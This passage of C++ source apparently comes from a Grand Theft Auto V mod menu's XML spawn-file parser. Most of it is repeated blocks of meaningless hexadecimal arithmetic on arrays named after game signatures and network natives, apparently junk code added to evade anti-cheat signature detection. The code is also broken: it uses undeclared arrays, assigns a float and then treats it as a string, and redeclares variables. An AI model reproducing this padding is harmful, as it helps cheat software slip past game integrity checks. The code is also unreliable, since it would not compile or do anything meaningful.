						matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
						offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (matriz[1] > aaaaaa)
						{
							matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
							matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
							matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
							matriz[7] = (0xB1231 * 0xA) + matriz[2];
							a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
						}
						else
						{
							matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
							matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
							matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
							matriz[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
							a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						}
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
						a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
						a = 0.0f;
						b = 0.0f;
						if (matriz[4] > 50.0f)
						{
							matriz[4] = matriz[1];
						}
						a2 = (matriz[4]) / (2 * matriz[2]);
						a1 = (matriz[3] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (matriz[3] + (5)) / (2 * matriz[2]);
						aaaaaa = 0xB2 * 2;
						a = 0.0f;
						a1 = (matriz[3] + (4)) / (2 * matriz[2]);
						b = 0.0f;
						matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
						matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						matriz[4] = matriz[1];
						matriz[7] = (0xB1231 * 0xA) + matriz[2];
						matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
						matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
						matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
						a2 = (matriz[4] + (3)) / (2 * matriz[2]);
						a2 = (matriz[4] + (2)) / (2 * matriz[2]);
						matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						matriz[1] = (0xB1231 * 0xA) + 0xA12;
						if (matriz[1] > aaaaaa)
						{
						}
						else
							a1 = (matriz[3] + (65)) / (2 * matriz[2]);
						a2 = (matriz[4] - (3)) / (2 * matriz[2]);

						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
							GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
							a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
						}
						else
						{
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
							GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
							GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
							a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						}
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
						a = 0.0f;
						b = 0.0f;
						if (GTA5_exe_sig_[4] > 50.0f)
						{
							GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						}
						a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
						a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						b = 0.0f;
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
						a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
							offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
							offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
							offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							offset = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (5) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						offset = (0xB1231 * 0xA) + 0xA12;
						if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
							TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
							TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
							a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
						}
						else
						{
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
							TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
							TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
							TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
							TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
							a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
							a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						}
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
						a = 0.0f;
						b = 0.0f;
						if (TriggerScriptEvent[4] > 50.0f)
						{
							TriggerScriptEvent[4] = TriggerScriptEvent[1];
						}
						a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
						a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
						NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
						a = 0.0f;
						a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						b = 0.0f;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
						a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
						{
						}
						else
							a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
						std::string b = a;
						b = Extern_Reader::StringManager::ReplaceWord(b, "<Yaw>", "");
						tokens.push_back(b);
					}
					//--------------------------------------------------------------
					else if (Extern_Reader::StringManager::SeContemTexto(token, "<ModelHash>"))
					{
						std::string a = Extern_Reader::StringManager::ReplaceWord(token, "<ModelHash>", "");
						a = Extern_Reader::StringManager::ReplaceWord(a, "</ModelHash>", "");
						std::string b = a;
						b = Extern_Reader::StringManager::ReplaceWord(b, "<ModelHash>", "");
						tokens.push_back(b);
					}
					else if (Extern_Reader::StringManager::SeContemTexto(token, "<HashName>"))
					{
						std::string a = Extern_Reader::StringManager::ReplaceWord(token, "<HashName>", "");
						a = Extern_Reader::StringManager::ReplaceWord(a, "</HashName>", "");
						std::string b = a;
						b = Extern_Reader::StringManager::ReplaceWord(b, "<HashName>", "");
						tokens.push_back(b);
					}
				}
			}
			return tokens;
		}
		void SpawnXML(std::string XMLpath, std::vector<std::string> vector, GTA::Spawn_Struct Estrutura)
		{
			//Exemplo::
			//GTA::Spawn_Struct A;
			//Menyoo::Carregar::SpawnXML(".\\MapaMenyoo.xml", Menyoo::Carregar::GetValues(".\\MapaMenyoo.xml"), A);
			std::vector<std::string> A = GetValues(XMLpath);
			for (int i = 3; i <= Extern_Reader::Simple_TXT_file::GetVectorSize(A); i++)
			{
				if (i <= (Extern_Reader::Simple_TXT_file::GetVectorSize(A) + 3))
				{
